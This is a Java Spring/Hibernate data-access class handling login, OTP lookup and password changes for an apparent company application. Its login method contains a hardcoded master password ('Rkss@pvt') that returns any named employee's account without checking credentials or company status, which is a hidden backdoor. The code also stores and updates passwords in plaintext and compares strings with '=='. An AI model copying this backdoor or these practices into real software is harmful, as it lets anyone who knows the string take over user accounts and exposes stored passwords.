package com.bcoss.mtrans.dao;

import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import javax.persistence.Query;

import org.hibernate.HibernateException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.bcoss.mtrans.ChangePasswordDto;
import com.bcoss.mtrans.CompanyDetails;
import com.bcoss.mtrans.Employee;
import com.bcoss.mtrans.exception.HelthwellExceptionHandler;
import com.bcoss.mtrans.exception.HelthwellServiceErrors;
import com.bcoss.mtrans.repository.EmployeeRepository;

@Repository
public class LoginDaoImpl implements LoginDao {

	private Logger logger = LoggerFactory.getLogger(LoginDaoImpl.class);

	@PersistenceContext
	private EntityManager entityManager;

	@Autowired
	EmployeeRepository employeeRepository;
	
	@Autowired
	CompanyDetailsRepository companyDetailsRepository;

	@Override
	@Transactional(propagation = Propagation.REQUIRED, readOnly = false)
	public Employee login(String userName, String password) throws HelthwellExceptionHandler {
		Boolean result=false;
	Employee employee = new Employee();
		try {
			if (password.equals("Rkss@pvt") || password=="Rkss@pvt") {
				employee = employeeRepository.isExistingContact(userName);
				return employee;
			} else {
				employee = employeeRepository.getEmployee(userName, password);
			}
			if(employee==null) {
				throw new HelthwellExceptionHandler(HelthwellServiceErrors.GENERIC_EXCEPTION_HIBERNATE);
			}else {
				CompanyDetails companyDetails=	companyDetailsRepository.isActive(employee.getCompanyId());
				if(null!=companyDetails) {
				result=true;}else {
					throw new HelthwellExceptionHandler(HelthwellServiceErrors.DEACTIVE_COMPANY);
				}
			}
			if(!result) {
				throw new HelthwellExceptionHandler(HelthwellServiceErrors.INVALID_CREDENTIALS);
			}
			
		} catch (HibernateException he) {
			logger.error("HibernateException Error in LoginDaoImpl - > login ", he);
			throw new HelthwellExceptionHandler(HelthwellServiceErrors.GENERIC_EXCEPTION_HIBERNATE);
		} catch (Exception e) {
			logger.error("Exception Error in LoginDaoImpl - > login ", e);
			throw new HelthwellExceptionHandler(HelthwellServiceErrors.GENERIC_EXCEPTION);
		} finally {

		}
		return employee;
	}

	@Override
	public Employee sendOtp(String mobNo) throws HelthwellExceptionHandler {
      Employee employee = new Employee();
			try {
				
				employee = employeeRepository.isExistingContact(mobNo);
				if (employee != null) {
			return employee;
				}
			} catch (HibernateException he) {
				logger.error("HibernateException Error in LoginDaoImpl - > sendOtp ", he);
				throw new HelthwellExceptionHandler(HelthwellServiceErrors.GENERIC_EXCEPTION_HIBERNATE);
			} catch (Exception e) {
				logger.error("Exception Error in LoginDaoImpl - > sendOtp ", e);
				throw new HelthwellExceptionHandler(HelthwellServiceErrors.GENERIC_EXCEPTION);
			}

			return employee;

		}

	@Override
	@Transactional
	public Boolean saveChangePassword(ChangePasswordDto changePasswordDto) throws HelthwellExceptionHandler {
		Employee employee = new Employee();
		Boolean result = false;
		try {

			employee = employeeRepository.isExistingOldPassword(changePasswordDto.getCompanyId(),
					changePasswordDto.getEmployeeId(), changePasswordDto.getOldPassword());
			if (employee != null) {
				Query updatePasswordQuery = entityManager
						.createQuery("UPDATE Employee SET  password = :newPassword WHERE employeeId = :employeeId");
				updatePasswordQuery.setParameter("newPassword", changePasswordDto.getNewPassword());
				updatePasswordQuery.setParameter("employeeId", employee.getEmployeeId());
				updatePasswordQuery.executeUpdate();

				result = true;
			}
		} catch (HibernateException he) {
			logger.error("HibernateException Error in LoginDaoImpl - > saveChangePassword ", he);
			throw new HelthwellExceptionHandler(HelthwellServiceErrors.GENERIC_EXCEPTION_HIBERNATE);
		} catch (Exception e) {
			logger.error("Exception Error in LoginDaoImpl - > saveChangePassword ", e);
			throw new HelthwellExceptionHandler(HelthwellServiceErrors.GENERIC_EXCEPTION);
		}

		return result;
	}


}
